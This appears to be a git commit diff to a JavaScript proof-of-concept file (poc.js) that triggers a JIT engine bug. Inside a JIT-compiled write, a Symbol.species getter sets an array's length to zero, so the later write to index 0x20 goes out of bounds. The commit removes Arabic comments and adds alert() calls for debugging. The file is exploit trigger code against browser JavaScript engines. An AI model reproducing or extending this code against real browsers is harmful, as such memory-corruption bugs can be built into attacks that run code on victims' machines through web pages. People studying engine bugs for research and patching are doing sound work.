032921b7e45abcc75edcb1d1dd772fd6a7b743b9
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2025-10-03 21:20:20 +0100

    Update poc.js

--- 4/poc.js
+++ 4/poc.js
@@ -2,19 +2,18 @@ let Trigger = false;
 let Arr = null;
 
 function Target(Special, Idx, Value) {
-    Arr[Idx] = 0x41414141; // كتابة قيمة أولية
-    Special.slice(); // يحفز الـ JIT
-    Arr[Idx] = Value; // كتابة القيمة النهائية
-    //alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16));
+    Arr[Idx] = 0x41414141;
+    Special.slice();
+    Arr[Idx] = Value;
+    alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16));
 }
 
 class SoSpecial extends Array {
     static get [Symbol.species]() {
         return function() {
             if (Trigger) {
-                Arr.length = 0; // تعديل الطول
-                alert('Length set to 0 by Symbol.species');
-                // بديل لـ gc(): إنشاء كائنات كبيرة لتحرير الذاكرة
+                Arr.length = 0;
+                alert('Length set to 0 by Symbol.species, Arr.length = ' + Arr.length);
                 let temp = new Array(1000000).fill(0);
             }
         };
@@ -23,14 +22,15 @@ class SoSpecial extends Array {
 
 function main() {
     const Snowflake = new SoSpecial();
-    Arr = new Array(0x21); // مصفوفة بحجم 33
+    Arr = new Array(0x21);
     Arr.fill(0);
     for (let Idx = 0; Idx < 0x400; Idx++) {
-        Target(Snowflake, 0, Idx); // تحفيز الـ JIT
+        Target(Snowflake, 0, Idx);
     }
     Trigger = true;
-    Target(Snowflake, 0x20, 0xBB); // استهداف الفهرس 32
-    alert('Final Arr[0x20] = ' + Arr[0x20].toString(16)); // مراقبة النتيجة
+    Target(Snowflake, 0x20, 0xBB);
+    alert('Final Arr[0x20] = ' + Arr[0x20].toString(16));
+    alert('Arr.length = ' + Arr.length); // مراقبة الطول النهائي
 }
 
 main();
